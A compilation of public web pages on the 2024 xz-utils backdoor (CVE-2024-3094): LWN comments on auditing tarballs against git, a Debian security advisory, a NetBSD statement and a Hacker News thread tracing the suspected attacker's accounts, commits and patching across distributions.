If this is also used for security somehow, to catch cases where the tarball was equal to the git release + some metadata and started having extra code, and/or if we add such functionality to most distributions, we could at least catch regressions and new issues and make backdooring (some) tarballs more difficult.

As for cases where the tarball differs, maybe a similar approach could work too: warnings about the extra files or a diff could be reported to the packagers and enable the packagers to fix that by either ignoring the warning or by removing the differences somehow (rm -f configure [...] && autoreconf -vfi && [...]) .

This is probably does not work well for all distributions as some have very simplistic build systems[1] that don't allow to modify the way all autotools builds or git fetch are done in a single place, but it's not necessarily a big issue as doing that in the other distributions still increase the probability of catching issues and avoiding it for the ones with simplistic build systems.

[1] Like every approach, they have advantages and disadvantages. One of the advantage of simplistic build systems is that making packages with these is way easier, and so it enables more people to contribute and/or to be empowered to package what they need, modify packages, etc. The disadvantage is that adding an option to most packages, or reusing the package information globally is time consuming.

### Automatically auditing tarballs?

Posted Apr 3, 2024 7:58 UTC (Wed)
by **smurf** (subscriber, #17840)
[[Link](/Articles/968131/)]

> many git repositories don't sign commits

You don't need to sign commits. You need to sign tags. Tagging a new version doesn't happen automatically (usually); it's the maintainer's job, not the repo's.

### A backdoor in xz

Posted Apr 5, 2024 8:55 UTC (Fri)
by **dvandeun** (guest, #24273)
[[Link](/Articles/968510/)]

The general public is being informed. It's nice that The Economist has a rather clueful article on this in its Leaders section.

Copyright © 2024, Eklektix, Inc.

Comments and public postings are copyrighted by their creators.

Linux is a registered trademark of Linus Torvalds



=== Content from lists.debian.org_701ff8af_20250111_034018.html ===


---

[[Date Prev](msg00056.html)][[Date Next](msg00058.html)]
[[Thread Prev](msg00056.html)][[Thread Next](msg00058.html)]
[[Date Index](maillist.html#00057)]
[[Thread Index](threads.html#00057)]

# [SECURITY] [DSA 5649-1] xz-utils security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 5649-1] xz-utils security update
* *From*: Salvatore Bonaccorso <carnil@debian.org>
* *Date*: Fri, 29 Mar 2024 16:09:37 +0000
* *Message-id*: <[[🔎]](/msgid-search/E1rqEnR-002Wbr-Jo%40seger.debian.org) [E1rqEnR-002Wbr-Jo@seger.debian.org](msg00057.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5649-1                   security@debian.org
<https://www.debian.org/security/>                     Salvatore Bonaccorso
March 29, 2024                        <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : xz-utils
CVE ID         : CVE-2024-3094

Andres Freund discovered that the upstream source tarballs for xz-utils,
the XZ-format compression utilities, are compromised and inject
malicious code, at build time, into the resulting liblzma5 library.

Right now no Debian stable versions are known to be affected.
Compromised packages were part of the Debian testing, unstable and
experimental distributions, with versions ranging from 5.5.1alpha-0.1
(uploaded on 2024-02-01), up to and including 5.6.1-1. The package has
been reverted to use the upstream 5.4.5 code, which we have versioned
5.6.1+really5.4.5-1.

Users running Debian testing and unstable are urged to update the
xz-utils packages.

For the detailed security status of xz-utils please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/xz-utils>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQKTBAEBCgB9FiEERkRAmAjBceBVMd3uBUy48xNDz0QFAmYG4XBfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldDQ2
NDQ0MDk4MDhDMTcxRTA1NTMxRERFRTA1NENCOEYzMTM0M0NGNDQACgkQBUy48xND
z0QBZg/9HMXAGIvBC12v8PSnp6EjnagxXBjTqLIJzEwQFgmC1cS58Kmv214c3fD+
rxHEfqQxcgjVSWPbIgI5ZXf1XZtx1YiMGRd9aEvKQSwLu0ox0/UR5igZakLrZb+n
t1qvH8AGYQhK41ysFJVwNulUXqqopvGEPgwopLfGPn8P3zjOrs0BoLqYmQ0nbsv3
92l9rAYk6W7G+L3Gwp/cQVzqmyErlEk/QB3Ld+6HLP7a8shY+A8a7iVHE1vkzNjw
JeZ2shIrvkCJqb1/BVSJU92fy2P4xjiMY8phDum7dzWnyy0WZLa90B/tDF9WB7Ok
nuUa020yxjflnabSM112We1V8D5sh18X30NK8scXiCD5cbPEysGqaUf8Baik9qux
Wkn60oqLKFN0VdrUxeqyLp1AC7wEiysQaNqv/8ZqhYF3/KxrbzgBOVy9XeB3pEfk
oLLPtUeH3kuXGw2Qp+Kqg3Zlfe04XZZX5kme/7PFkBvjZ8JFH7dWW+eEO9MbnsPD
br0tWxod0jhvLdZ6YLFad6q2jkjqO3LH3+SYAhp+otcY1TNpIe7xWAB+Phj0TJqu
IoSnYutqEb4mwoUzn9vZRzOxLvyePEJwbFG89sQf4GCYm4FwDhyB51Eo5piC7Fre
EtfsmdU7xAl6tljtUkzTHz27dBIokrgw4W0YrYaeUSmm3jKttPA=
=522l
-----END PGP SIGNATURE-----

```

---



=== Content from twitter.com_9d38ad51_20250111_034039.html ===



=== Content from blog.netbsd.org_0025d843_20250111_034005.html ===


» [The Guide](http://www.NetBSD.org/docs/guide/en/) | [Manual pages](http://man.NetBSD.org) | [Mailing lists](http://www.NetBSD.org/mailinglists/) and [Archives](http://mail-index.NetBSD.org/) | [CVS repository](http://cvsweb.NetBSD.org/) | [Report](http://www.NetBSD.org/cgi-bin/sendpr.cgi?gndb=netbsd) or [query](http://gnats.NetBSD.org/) a bug | [Software Packages](http://www.NetBSD.org/docs/software/packages.html)

[![[NetBSD Logo]](/tnf/resource/NetBSD-headerlogo.png)](/)

[Home](http://blog.netbsd.org/tnf/ "Home") |
![](/tnf/resource/feed-icon-14x14.png)[RSS](http://blog.netbsd.org/tnf/feed/entries/atom) |
[Release engineering](/tnf/category/Release%2Bengineering "Blog about NetBSD release engineering.") |  [Development](/tnf/category/Development "About NetBSD development.") |  [The NetBSD Foundation](/tnf/category/The%2BNetBSD%2BFoundation "TNF articles.") |  [Networking](/tnf/category/Networking) |  [General](/tnf/category/General "General") |  [Ports](/tnf/category/Ports "Port specific news") |  [Security](/tnf/category/Security "Security advisories and security related information.") |  [Events](/tnf/category/Events "Upcoming and past events.") |  [Packages](/tnf/category/Packages "The most portable package software in the world.") |
[Login](/roller-ui/login-redirect.rol)

### Bookmarks

* [The NetBSD Project](https://www.NetBSD.org/ "NetBSD is a free, secure, and highly portable Unix-like Open Source operating system available for many platforms, from large-scale server systems to powerful desktop systems to handheld and embedded devices.")
* [NetBSD Wiki](https://wiki.netbsd.org/ "The NetBSD Wiki is a collaborative writing project to build useful resources for NetBSD users.")

### Feeds

* [All](http://blog.netbsd.org/tnf/feed/entries/atom)
* [/Release engineering](http://blog.netbsd.org/tnf/feed/entries/atom?cat=%2FRelease+engineering)
* [/Development](http://blog.netbsd.org/tnf/feed/entries/atom?cat=%2FDevelopment)
* [/The NetBSD Foundation](http://blog.netbsd.org/tnf/feed/entries/atom?cat=%2FThe+NetBSD+Foundation)
* [/Networking](http://blog.netbsd.org/tnf/feed/entries/atom?cat=%2FNetworking)
* [/General](http://blog.netbsd.org/tnf/feed/entries/atom?cat=%2FGeneral)
* [/Ports](http://blog.netbsd.org/tnf/feed/entries/atom?cat=%2FPorts)
* [/Security](http://blog.netbsd.org/tnf/feed/entries/atom?cat=%2FSecurity)
* [/Events](http://blog.netbsd.org/tnf/feed/entries/atom?cat=%2FEvents)
* [/Packages](http://blog.netbsd.org/tnf/feed/entries/atom?cat=%2FPackages)
* [Comments](http://blog.netbsd.org/tnf/feed/comments/atom)

## [Statement on backdoor in xz library](/tnf/entry/statement_on_backdoor_in_xz)

March 30, 2024 posted by *Nia Alarie*

Recently, [a backdoor was discovered in the xz compression library](https://www.openwall.com/lists/oss-security/2024/03/29/4). xz/liblzma are included as a part of NetBSD and used by the project for distribution of new releases and packages.

The version of xz shipped in all stable (and unstable) versions of NetBSD predates any code changes by the author of the backdoor. NetBSD is therefore safe and **unaffected** by the recent discoveries. It is believed that the attack only targets Linux/glibc, but checking this allowed us to rule out any other attempts at compromising the library by the author.

The version of xz shipped in pkgsrc, however, is affected. Using xz from pkgsrc is a non-default setting on NetBSD, and requires explicit opt-in. Most users of NetBSD will not install xz from pkgsrc because the version from the base system is preferred. However, users of pkgsrc on other platforms will need to take precautions.

Regardless of NetBSD being affected or not, the discovery of the backdoor is a wake-up call and further discussion will be happening internally over how to proceed.

[[1 comment](/tnf/entry/statement_on_backdoor_in_xz#comments)]

« [NetBSD 10.0 RC6...](/tnf/entry/netbsd_10_0_rc6_available) |
[Main](/tnf/)
| [NetBSD 10.0 availabl...](/tnf/entry/netbsd_10_0_available) »

[Contact](http://www.NetBSD.org/cgi-bin/feedback.cgi) | [Disclaimer](http://www.NetBSD.org/about/disclaimer.html) | Copyright © 1994-2015 The NetBSD Foundation, Inc. ALL RIGHTS RESERVED.

NetBSD® is a registered trademark of The NetBSD Foundation, Inc.



=== Content from news.ycombinator.com_428c8921_20250111_034028.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D39865810) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [Backdoor in upstream xz/liblzma leading to SSH server compromise](https://www.openwall.com/lists/oss-security/2024/03/29/4) ([openwall.com](from?site=openwall.com)) | | --- | --- | --- | |  | | 4549 points by [rkta](user?id=rkta) [9 months ago](item?id=39865810)  | [hide](hide?id=39865810&goto=item%3Fid%3D39865810) | [past](https://hn.algolia.com/?query=Backdoor%20in%20upstream%20xz%2Fliblzma%20leading%20to%20SSH%20server%20compromise&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=39865810&auth=e90d5560e60d161f13996681b44231444af29ae5) | [1849 comments](item?id=39865810) |  | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39866275)   | [next](#39866551) [–]  Very annoying - the apparent author of the backdoor was in communication with me over several weeks trying to get xz 5.6.x added to Fedora 40 & 41 because of it's "great new features". We even worked with him to fix the valgrind issue (which it turns out now was caused by the backdoor he had added). We had to race last night to fix the problem after an inadvertent break of the embargo. He has been part of the xz project for 2 years, adding all sorts of binary test files, and to be honest with this level of sophistication I would be suspicious of even older versions of xz until proven otherwise. | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39870098)   | [parent](#39866275) | [next](#39866936) [–]  GitHub has suspended @JiaT75's account. EDIT: Lasse Collin's account @Larhzu has also been suspended. EDIT: Github has disabled all Tukaani repositories, including downloads from the releases page. -- EDIT: Just did a bit of poking. xz-embedded was touched by Jia as well and it appears to be used in the linux kernel. I did quick look and it doesn't appear Jia touched anything of interest in there. I also checked the previous mirror at the tukaani project website, and nothing was out of place other than lagging a few commits behind: [https://gist.github.com/Qix-/f1a1b9a933e8847f56103bc14783ab7...](https://gist.github.com/Qix-/f1a1b9a933e8847f56103bc14783ab7b) -- Here's a mailing list message from them ca. 2022. [https://listor.tp-sv.se/pipermail/tp-sv\_listor.tp-sv.se/2022...](https://listor.tp-sv.se/pipermail/tp-sv_listor.tp-sv.se/2022-November/000802.html) -- MinGW w64 on AUR was last published by Jia on Feb 29: <https://aur.archlinux.org/cgit/aur.git/log/?h=mingw-w64-xz> (found by searching their public key: 22D465F2B4C173803B20C6DE59FCF207FEA7F445) -- pacman-static on AUR still lists their public key as a contributor, xz was last updated to 5.4.5 on 17-11-2023: <https://aur.archlinux.org/cgit/aur.git/?h=pacman-static> EDIT: I've emailed the maintainer to have the key removed. -- Alpine was patched as of 6 hours ago. [https://git.alpinelinux.org/aports/commit/?id=982d2c6bcbbb57...](https://git.alpinelinux.org/aports/commit/?id=982d2c6bcbbb579e85bb27c40be84072ca0b1fd9) -- OpenSUSE is still listing Jia's public key: [https://sources.suse.com/SUSE:SLE-15-SP6:GA/xz/576e550c49a36...](https://sources.suse.com/SUSE%3ASLE-15-SP6%3AGA/xz/576e550c49a3667a44b6375fb28916e5/xz.keyring) (cross-ref with [https://web.archive.org/web/20240329235153/https://tukaani.o...](https://web.archive.org/web/20240329235153/https%3A//tukaani.org/misc/jia_tan_pubkey.txt)) EDIT: Spoke with some folks in the package channel on libera, seems to be a non-issue. It is not used as attestation nor an ACL. -- Arch appears to still list Jia as an approved publisher, if I'm understanding this page correctly. [https://gitlab.archlinux.org/archlinux/packaging/packages/xz...](https://gitlab.archlinux.org/archlinux/packaging/packages/xz/-/blob/main/keys/pgp/22D465F2B4C173803B20C6DE59FCF207FEA7F445.asc) EDIT: Just sent an email to the last committer to bring it to their attention. EDIT: It's been removed. -- jiatan's Libera info indicates they registered on Dec 12 13:43:12 2022 with no timezone information. ```     -NickServ- Information on jiatan (account jiatan):     -NickServ- Registered : Dec 12 13:43:12 2022 +0000 (1y 15w 3d ago)     -NickServ- Last seen : (less than two weeks ago)     -NickServ- User seen : (less than two weeks ago)     -NickServ- Flags : HideMail, Private     -NickServ- jiatan has enabled nick protection     -NickServ- *** End of Info ***  ``` /whowas expired not too long ago, unfortunately. If anyone has it I'd love to know. They are not registered on freenode. EDIT: Libera has stated they have not received any requests for information from any agencies as of yet (30th Saturday March 2024 00:39:31 UTC). EDIT: Jia Tan was using a VPN to connect; that's all I'll be sharing here. | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39871231)   | [root](#39866275) | [parent](#39870098) | [next](#39873943) [–]  Just for posterity since I can no longer edit: Libera staff has been firm and unrelenting in their position not to disclose anything whatsoever about the account. I obtained the last point on my own. Libera has made it clear they will not budge on this topic, which I applaud and respect. They were not involved whatsoever in ascertaining a VPN was used, and since that fact makes anything else about the connection information moot, there's nothing else to say about it. | | --- | --- | --- | | | |  |  | [Fnoord](user?id=Fnoord) [9 months ago](item?id=39876042)   | [root](#39866275) | [parent](#39871231) | [next](#39873943) [5 more]  [flagged] | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39876224)   | [root](#39866275) | [parent](#39876042) | [next](#39876161) [–]  I am not LE nor a government official. I did not present a warrant of any kind. I asked in a channel about it. Libera refused to provide information. Libera respecting the privacy of users is of course something I applaud and respect. Why wouldn't I? | | --- | --- | --- | | | |  |  | [freeone3000](user?id=freeone3000) [9 months ago](item?id=39876161)   | [root](#39866275) | [parent](#39876042) | [prev](#39876224) | [next](#39878877) [–]  Respect not giving out identifying information on individuals whenever someone asks, no matter what company they work for and what job they do? Yes. I respect this. | | --- | --- | --- | | | |  |  | [flykespice](user?id=flykespice) [9 months ago](item?id=39878877)   | [root](#39866275) | [parent](#39876042) | [prev](#39876161) | [next](#39876618) [–]  It's called keeping integrity on not disclosing private info any users from your network, regardless whether they are bad actors. I respect them for that. Violating that code is just as bad as the bad actor slipping backdoors. | | --- | --- | --- | | | |  |  | [supposemaybe](user?id=supposemaybe) [9 months ago](item?id=39876618)   | [root](#39866275) | [parent](#39876042) | [prev](#39878877) | [next](#39873943) [–]  I hope you aren’t in control of any customer data. | | --- | --- | --- | | | |  |  | [reisse](user?id=reisse) [9 months ago](item?id=39873943)   | [root](#39866275) | [parent](#39870098) | [prev](#39871231) | [next](#39872693) [–]  > EDIT: Github has disabled all Tukaani repositories, including downloads from the releases page. Why? Isn't it better to freeze them and let as many people as possible analyze the code? | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39874159)   | [root](#39866275) | [parent](#39873943) | [next](#39874587) [–]  Good question, though I can imagine they took this action for two reasons: 1. They don't have the ability to freeze repos (i.e. would require some engineering effort to implement it), as I've never seen them do that before. 2. Many distros (and I assume many enterprises) were still linking to the GitHub releases to source the infected tarballs for building. Disabling the repo prevents that. The infected tarballs and repo are still available elsewhere for researchers to find, too. | | --- | --- | --- | | | |  |  | [nihilanth](user?id=nihilanth) [9 months ago](item?id=39874389)   | [root](#39866275) | [parent](#39874159) | [next](#39874587) [–]  They could always archive it. Theoretically (and I mean theoretically only), there's another reason for Microsoft to prevent access to repo: if a nation state was involved, and there've been backdoor conversations to obfuscate the trail. | | --- | --- | --- | | | |  |  | [jarfil](user?id=jarfil) [9 months ago](item?id=39877690)   | [root](#39866275) | [parent](#39874389) | [next](#39874587) [–]  Archiving the repo doesn't stop the downloads. They would need to rename it in order to prevent distro CI/CD from keeping downloading untrustworthy stuff. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39904508)   | [root](#39866275) | [parent](#39877690) | [next](#39874587) [–]  Distros downloading directly from GitHub deserve what they get. | | --- | --- | --- | | | |  |  | [AtNightWeCode](user?id=AtNightWeCode) [9 months ago](item?id=39874587)   | [root](#39866275) | [parent](#39873943) | [prev](#39874159) | [next](#39874150) [–]  Maybe one can get the code from here. New commits being added it seems. <https://git.tukaani.org/> | | --- | --- | --- | | | |  |  | [ptx](user?id=ptx) [9 months ago](item?id=39876115)   | [root](#39866275) | [parent](#39874587) | [next](#39874150) [–]  The latest commit is interesting (f9cf4c05edd14, "Fix sabotaged Landlock sandbox check"). It looks like one of Jia Tan's commits (328c52da8a2) added a stray "." character to a piece of C code that was part of a check for sandboxing support, which I guess would cause the code to fail to compile, causing the check to fail, causing the sandboxing to be disabled. | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39876466)   | [root](#39866275) | [parent](#39876115) | [next](#39878307) [–]  Lasse has also started his own documentation on the incident. <https://tukaani.org/xz-backdoor/> | | --- | --- | --- | | | |  |  | [josefx](user?id=josefx) [9 months ago](item?id=39878307)   | [root](#39866275) | [parent](#39876115) | [prev](#39876466) | [next](#39904555) [–]  Shouldn't they have tests running to ensure that the check works on at least some systems? | | --- | --- | --- | | | |  |  | [windenntw](user?id=windenntw) [9 months ago](item?id=39883011)   | [root](#39866275) | [parent](#39878307) | [next](#39904555) [–]  What do you mean "tests"? | | --- | --- | --- | | | |  |  | [josefx](user?id=josefx) [9 months ago](item?id=39893948)   | [root](#39866275) | [parent](#39883011) | [next](#39904555) [–]  Have a system were you wxpect the sandboxing to work and have an automated check that it compiles there? | | --- | --- | --- | | | |  |  | [ptx](user?id=ptx) [9 months ago](item?id=39904607)   | [root](#39866275) | [parent](#39893948) | [next](#39904555) [–]  Part of the backdoor was in the tests. The attacker in this case could easily have sabotaged the test as well if a test was required. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39904555)   | [root](#39866275) | [parent](#39876115) | [prev](#39878307) | [next](#39874150) [–]  If your project becomes complex enough eventually you need tests for the configure step. Even without malicious actors its easy to miss that a compiler or system change broke some check. | | --- | --- | --- | | | |  |  | [Sebb767](user?id=Sebb767) [9 months ago](item?id=39874150)   | [root](#39866275) | [parent](#39873943) | [prev](#39874587) | [next](#39875889) [–]  You can still find the source everywhere, if you look for it. Having a fine-looking page distribute vulnerable source code is a much bigger threat. | | --- | --- | --- | | | |  |  | [godelski](user?id=godelski) [9 months ago](item?id=39875889)   | [root](#39866275) | [parent](#39873943) | [prev](#39874150) | [next](#39875583) [–]  You can find it on archive. Someone archived it last night | | --- | --- | --- | | | |  |  | [megous](user?id=megous) [9 months ago](item?id=39875583)   | [root](#39866275) | [parent](#39873943) | [prev](#39875889) | [next](#39872693) [2 more]  [flagged] | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39876261)   | [root](#39866275) | [parent](#39875583) | [next](#39872693) [–]  Don't agree here. I've only ever seen GitHub do this in extreme circumstances where they were *absolutely* warranted. | | --- | --- | --- | | | |  |  | [Phenylacetyl](user?id=Phenylacetyl) [9 months ago](item?id=39872693)   | [root](#39866275) | [parent](#39870098) | [prev](#39873943) | [next](#39873022) [–]  The alpine patch includes gettext-dev which is likely also exploited as the same authors have been pushing gettext to projects where their changes have been questioned | | --- | --- | --- | | | |  |  | [jwilk](user?id=jwilk) [9 months ago](item?id=39873830)   | [root](#39866275) | [parent](#39872693) | [next](#39873022) [–]  What do you mean? | | --- | --- | --- | | | |  |  | [everybackdoor](user?id=everybackdoor) [9 months ago](item?id=39874698)   | [root](#39866275) | [parent](#39873830) | [next](#39873022) [–]  Look at the newest commits, do you see anything suspicious: <https://git.alpinelinux.org/aports/log/main/gettext> libunistring could also be affected as that has also been pushed there | | --- | --- | --- | | | |  |  | [whoopdedo](user?id=whoopdedo) [9 months ago](item?id=39875338)   | [root](#39866275) | [parent](#39874698) | [next](#39876145) [–]  Seeing so many commits that are "skip failing test" is a very strong code smell. | | --- | --- | --- | | | |  |  | [gray\_-\_wolf](user?id=gray_-_wolf) [9 months ago](item?id=39893056)   | [root](#39866275) | [parent](#39875338) | [next](#39876145) [–]  Yes, but it is often a sad reality of trying to run projects mainly written for glibc on musl. Not many people write portable C these days. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39904581)   | [root](#39866275) | [parent](#39893056) | [next](#39876145) [–]  It's still the wrong way to go about things. Tests are there for a reason, meaning if they fail you should try to understand them to the point where you can fix the problem (broken test or actual bug) instead of just wantonly distabling tests until you get a green light. | | --- | --- | --- | | | |  |  | [jwilk](user?id=jwilk) [9 months ago](item?id=39876145)   | [root](#39866275) | [parent](#39874698) | [prev](#39875338) | [next](#39873022) [–]  > do you see anything suspicious No. > libunistring could also be affected as that has also been pushed there What do you mean by "that"? | | --- | --- | --- | | | |  |  | [mook](user?id=mook) [9 months ago](item?id=39873022)   | [root](#39866275) | [parent](#39870098) | [prev](#39872693) | [next](#39877321) [–]  FWIW, that's mingw-w64-xz (cross-compiled xz utils) in AUR, not ming-w64 (which would normally refer to the compiler toolchain itself). | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39873395)   | [root](#39866275) | [parent](#39873022) | [next](#39877321) [–]  Good catch, thanks :) | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39877321)   | [root](#39866275) | [parent](#39870098) | [prev](#39873022) | [next](#39876938) [–]  It appears to be an RCE, not a public key bypass: <https://news.ycombinator.com/item?id=39877312> | | --- | --- | --- | | | |  |  | [mikolajw](user?id=mikolajw) [9 months ago](item?id=39876938)   | [root](#39866275) | [parent](#39870098) | [prev](#39877321) | [next](#39876757) [–]  I've posted an earlier WHOWAS of jiatan here: <https://news.ycombinator.com/item?id=39868773> | | --- | --- | --- | | | |  |  | [hypnagogic](user?id=hypnagogic) [9 months ago](item?id=39876757)   | [root](#39866275) | [parent](#39870098) | [prev](#39876938) | [next](#39909926) [–]  Asking this here too: why isn't there an automated A/B or diff match for the tarball contents to match the repo, auto-flag with a warning if that happens? Am I missing something here? | | --- | --- | --- | | | |  |  | [nolist\_policy](user?id=nolist_policy) [9 months ago](item?id=39877275)   | [root](#39866275) | [parent](#39876757) | [next](#39909926) [–]  The tarballs mismatching from the git tree is a feature, not a bug. Projects that use submodules may want to include these and projects using autoconf may want to generate and include the configure script. | | --- | --- | --- | | | |  |  | [hypnagogic](user?id=hypnagogic) [9 months ago](item?id=39884271)   | [root](#39866275) | [parent](#39877275) | [next](#39877418) [–]  > The tarballs mismatching from the git tree is a feature, not a bug. A feature which allowed the exploit to take place, let's put it that way. Over here: [https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78b...](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27) > The release tarballs upstream publishes don't have the same code that GitHub has. This is common in C projects so that downstream consumers don't need to remember how to run autotools and autoconf. The version of build-to-host.m4 in the release tarballs differs wildly from the upstream on GitHub. Multiple suggestions on that thread on how that's a legacy practice that might be outdated, especially in the current climate of cyber threats. Someone even posted a more thorough gist on what could be done to increase transparency and reduce discrepancies between tarballs and repos: [https://gist.github.com/smintrh78/97b5cb4d8332ea4808f25b47c8...](https://gist.github.com/smintrh78/97b5cb4d8332ea4808f25b47c80ac73d) | | --- | --- | --- | | | |  |  | [ano-ther](user?id=ano-ther) [9 months ago](item?id=39877418)   | [root](#39866275) | [parent](#39877275) | [prev](#39884271) | [next](#39909926) [–]  Here is a longer explainer: <https://www.redhat.com/en/blog/what-open-source-upstream> | | --- | --- | --- | | | |  |  | [hypnagogic](user?id=hypnagogic) [9 months ago](item?id=39884351)   | [root](#39866275) | [parent](#39877418) | [next](#39909926) [–]  "lol" > Those days are pretty much behind us. Sure, you can compile code and tweak software configurations if you want to--but most of the time, users don't want to. Organizations generally don't want to, they want to rely on certified products that they can vet for their environment and get support for. This is why enterprise open source exists. Users and organizations count on vendors to turn upstreams into coherent downstream products that meet their needs. > In turn, vendors like Red Hat learn from customer requests and feedback about what features they need and want. That, then, benefits the upstream project in the form of new features and bugfixes, etc., and ultimately finds its way into products and the cycle continues. "and when the upstream is tainted, everyone drinks poisoned water downstream, simple as that!" | | --- | --- | --- | | | |  |  | [menomatter](user?id=menomatter) [9 months ago](item?id=39909926)   | [root](#39866275) | [parent](#39870098) | [prev](#39876757) | [next](#39866936) [–]  account is back online <https://github.com/JiaT75> | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39914643)   | [root](#39866275) | [parent](#39909926) | [next](#39866936) [–]  Hopefully still locked just visible so people can find and alayze his contributions. | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39866936)   | [parent](#39866275) | [prev](#39870098) | [next](#39867078) [–]  I think this has been in the making for almost a year. The whole ifunc infrastructure was added in June 2023 by Hans Jansen and Jia Tan. The initial patch is "authored by" Lasse Collin in the git metadata, but the code actually came from Hans Jansen: [https://github.com/tukaani-project/xz/commit/ee44863ae88e377...](https://github.com/tukaani-project/xz/commit/ee44863ae88e377a5df10db007ba9bfadde3d314) > Thanks to Hans Jansen for the original patch. <https://github.com/tukaani-project/xz/pull/53> There were a ton of patches by these two subsequently because the ifunc code was breaking with all sorts of build options and obviously caused many problems with various sanitizers. Subsequently the configure script was modified multiple times to detect the use of sanitizers and abort the build unless either the sanitizer was disabled or the use of ifuncs was disabled. That would've masked the payload in many testing and debugging environments. The hansjans162 Github account was created in 2023 and the only thing it did was add this code to liblzma. The same name later applied to do a NMU at Debian for the vulnerable version. Another "<name><number>" account (which only appears here, once) then pops up and asks for the vulnerable version to be imported: [https://www.mail-archive.com/search?l=debian-bugs-dist@lists...](https://www.mail-archive.com/search?l=debian-bugs-dist@lists.debian.org&q=from:%22krygorin4545%22) | | --- | --- | --- | | | |  |  | [bed99](user?id=bed99) [9 months ago](item?id=39868390)   | [root](#39866275) | [parent](#39866936) | [next](#39872872) [–]  1 week ago "Hans Jansen" user "hjansen" was created in debian and opened 8 PRs including the upgrade to 5.6.1 to xz-utils From <https://salsa.debian.org/users/hjansen/activity> Author: Hans Jansen <hansjansen162@outlook.com> - [Debian Games / empire](<https://salsa.debian.org/games-team/empire>): opened merge request "!2 New upstream version 1.17" - March 17, 2024 - [Debian Games / empire](<https://salsa.debian.org/games-team/empire>): opened merge request "!1 Update to upstream 1.17" - March 17, 2024 - [Debian Games / libretro / libretro-core-info]([https://salsa.debian.org/games-team/libretro/libretro-core-i...](https://salsa.debian.org/games-team/libretro/libretro-core-info)): opened merge request "!2 New upstream version 1.17.0" - March 17, 2024 - [Debian Games / libretro / libretro-core-info]([https://salsa.debian.org/games-team/libretro/libretro-core-i...](https://salsa.debian.org/games-team/libretro/libretro-core-info)): opened merge request "!1 Update to upstream 1.17.0" - March 17, 2024 - [Debian Games / endless-sky](<https://salsa.debian.org/games-team/endless-sky>): opened merge request "!6 Update upstream branch to 0.10.6" - March 17, 2024 - [Debian Games / endless-sky](<https://salsa.debian.org/games-team/endless-sky>): opened merge request "!5 Update to upstream 0.10.6" - March 17, 2024 - [Debian / Xz Utils](<https://salsa.debian.org/debian/xz-utils>): opened merge request "!1 Update to upstream 5.6.1" - March 17, 2024 | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39868644)   | [root](#39866275) | [parent](#39868390) | [next](#39877938) [–]  That looks exactly like what you'd want to see to disguise the actual request you want, a number of pointless upstream updates in things that are mostly ignored, and then the one you want. | | --- | --- | --- | | | |  |  | [detistea](user?id=detistea) [9 months ago](item?id=39877938)   | [root](#39866275) | [parent](#39868390) | [prev](#39868644) | [next](#39872872) [–]  glad I didn't merge it ... | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39872872)   | [root](#39866275) | [parent](#39866936) | [prev](#39868390) | [next](#39867049) [–]  Make it two years. Jia Tan getting maintainer access looks like it is almost certainly to be part of the operation. Lasse Colling mentioned multiple times how Jia has helped off-list and to me it seems like Jia befriended Lasse as well (see how Lasse talks about them in 2023). Also the pattern of astroturfing dates back to 2022. See for example this thread where Jia, who has helped at this point for a few weeks, posts a patch, and a <name><number>@protonmail (jigarkumar17) user pops up and then bumps the thread three times(!) lamenting the slowness of the project and pushing for Jia to get commit access: [https://www.mail-archive.com/xz-devel@tukaani.org/msg00553.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00553.html) Naturally, like in the other instances of this happening, this user only appears once on the internet. | | --- | --- | --- | | | |  |  | [zb3](user?id=zb3) [9 months ago](item?id=39867049)   | [root](#39866275) | [parent](#39866936) | [prev](#39872872) | [next](#39869538) [–]  Also I saw this hans jansen user pushing for merging the 5.6.1 update in debian: <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708> | | --- | --- | --- | | | |  |  | [hxelk1](user?id=hxelk1) [9 months ago](item?id=39869226)   | [root](#39866275) | [parent](#39867049) | [next](#39869538) [–]  From: krygorin4545 <krygorin4545@proton.me> To: "1067708@bugs.debian.org" <1067708@bugs.debian.org> Cc: "sebastian@breakpoint.cc" <sebastian@breakpoint.cc>, "bage@debian.org" <bage@debian.org> Subject: Re: RFS: 